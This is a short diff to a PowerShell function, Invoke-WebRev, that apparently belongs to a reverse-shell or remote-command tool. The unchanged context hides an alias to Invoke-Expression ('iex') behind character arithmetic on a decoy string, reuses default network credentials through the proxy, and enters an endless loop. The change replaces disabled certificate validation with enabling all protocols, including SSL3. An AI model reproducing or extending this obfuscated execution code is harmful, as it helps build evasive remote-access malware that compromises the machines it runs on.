@@ -35,7 +35,9 @@ function Invoke-WebRev{
     $x = "taleska-ei-vrixeka"; Set-alias $x ($x[$true-10] + ($x[[byte]("0x" + "FF") - 265]) + $x[[byte]("0x" + "9a") - 158])
     
     (New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;
-    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+    #[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+    $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12';
+    [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols;
 
     while ($true)
     {
